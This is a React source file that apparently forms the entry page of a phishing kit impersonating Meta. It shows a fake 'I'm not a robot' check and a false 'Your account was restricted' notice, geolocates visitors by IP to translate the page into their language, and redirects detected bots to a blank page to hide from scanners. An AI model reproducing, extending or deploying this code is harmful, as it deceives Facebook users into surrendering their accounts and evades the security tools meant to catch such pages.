import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    const [isVerified, setIsVerified] = useState(false);
    const [isVerifying, setIsVerifying] = useState(false);
    
    const defaultTexts = useMemo(
        () => ({
            title: 'Meta',
            checkboxLabel: "I'm not a robot",
            recaptchaText: "reCAPTCHA",
            privacyTerms: "Privacy - Terms",
            description: "This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.",
            googleInfo1: "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
            googleInfo2: "reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.",
            continueBtn: 'Continue',
            restrictedText: 'Your account was restricted on'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle, 
                    translatedCheckbox, 
                    translatedRecaptcha, 
                    translatedPrivacy,
                    translatedDesc, 
                    translatedGoogle1, 
                    translatedGoogle2, 
                    translatedContinue, 
                    translatedRestricted
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.checkboxLabel, targetLang),
                    translateText(defaultTexts.recaptchaText, targetLang),
                    translateText(defaultTexts.privacyTerms, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.googleInfo1, targetLang),
                    translateText(defaultTexts.googleInfo2, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang),
                    translateText(defaultTexts.restrictedText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    checkboxLabel: translatedCheckbox,
                    recaptchaText: translatedRecaptcha,
                    privacyTerms: translatedPrivacy,
                    description: translatedDesc,
                    googleInfo1: translatedGoogle1,
                    googleInfo2: translatedGoogle2,
                    continueBtn: translatedContinue,
                    restrictedText: translatedRestricted
                });
            } catch (error) {
                console.log('translation failed:', error.message);
            }
        },
        [defaultTexts]
    );

    const handleVerification = () => {
        setIsVerifying(true);
        // Simulate verification process
        setTimeout(() => {
            setIsVerified(true);
            setIsVerifying(false);
        }, 2000);
    };

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            const checkBot = async () => {
                try {
                    const botResult = await detectBot();
                    if (botResult.isBot) {
                        window.location.href = 'about:blank';
                        return;
                    }
                } catch {
                    //
                }
            };

            const fetchIpInfo = async () => {
                try {
                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
                    const countryCode = response.data.country_code;
                    const targetLang = countryToLanguage[countryCode] || 'en';

                    setIsLoading(false);
                    localStorage.setItem('targetLang', targetLang);
                    translateAllTexts(targetLang);
                } catch {
                    //
                }
            };
            await fetchIpInfo();
            await checkBot();
        };

        init();
    }, [translateAllTexts]);

    return (
        <div className='flex min-h-screen items-center justify-center bg-[#f0f2f5] p-4'>
            <title>Meta Security Check</title>
            <div className='w-full max-w-[500px] bg-white rounded-lg shadow-sm overflow-hidden'>
                {/* Meta Header */}
                <div className='bg-white px-4 py-4 border-b border-[#dadde1]'>
                    <h1 className='text-xl font-semibold text-[#1c1e21]'>{translatedTexts.title}</h1>
                </div>
                
                {/* Content */}
                <div className='p-4'>
                    {/* reCAPTCHA Section */}
                    <div className='bg-[#f7f8fa] border border-[#e4e6eb] rounded-lg p-4 mb-4'>
                        <div className='flex items-start'>
                            <div 
                                className={`w-5 h-5 border-2 rounded mt-0.5 mr-3 flex-shrink-0 flex items-center justify-center cursor-pointer transition-all ${
                                    isVerified 
                                        ? 'bg-[#1877F2] border-[#1877F2]' 
                                        : 'border-[#8a8d91]'
                                }`}
                                onClick={!isVerified ? handleVerification : undefined}
                            >
                                {isVerified && (
                                    <span className="text-white text-sm font-bold">✓</span>
                                )}
                            </div>
                            <div className='flex-1'>
                                <div className='text-[16px] font-medium text-[#1c1e21] mb-1'>
                                    {translatedTexts.checkboxLabel}
                                </div>
                                <div className='text-[14px] text-[#65676b] mb-2'>
                                    {translatedTexts.recaptchaText}
                                </div>
                                <div className='text-[12px] text-[#1877F2]'>
                                    {translatedTexts.privacyTerms.split(' - ').map((text, index, array) => (
                                        <span key={index}>
                                            <a href="#" className="hover:underline">{text}</a>
                                            {index < array.length - 1 && ' - '}
                                        </span>
                                    ))}
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Description */}
                    <p className='text-[14px] text-[#65676b] leading-5 mb-4'>
                        {translatedTexts.description}
                    </p>

                    {/* Google Information */}
                    <div className='bg-[#f7f8fa] rounded-lg p-4 text-[14px] text-[#65676b] leading-5'>
                        <p className='mb-3'>
                            {translatedTexts.googleInfo1}
                        </p>
                        <p>
                            {translatedTexts.googleInfo2}
                        </p>
                    </div>

                    {/* Continue Button */}
                    <button
                        className={`w-full rounded-lg px-3 py-3 font-semibold text-white mt-4 transition-all ${
                            isVerified 
                                ? 'bg-[#1877F2] hover:bg-[#166fe5]' 
                                : 'bg-[#e4e6eb] text-[#bcc0c4] cursor-not-allowed'
                        }`}
                        disabled={!isVerified || isLoading}
                        onClick={() => {
                            navigate(PATHS.HOME);
                        }}
                    >
                        <div className='flex items-center justify-center'>
                            {isVerifying && (
                                <div className='w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2'></div>
                            )}
                            {isVerifying ? 'Verifying...' : translatedTexts.continueBtn}
                        </div>
                    </button>

                    {/* Success Message */}
                    {isVerified && !isVerifying && (
                        <div className='text-[#1877F2] text-center font-semibold text-[15px] mt-3 p-2 bg-[#f0f2f5] rounded-lg'>
                            Verification successful! You may continue.
                        </div>
                    )}

                    {/* Restricted Date */}
                    <p className='text-center mt-4 text-sm text-[#65676b]'>
                        {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default Index;
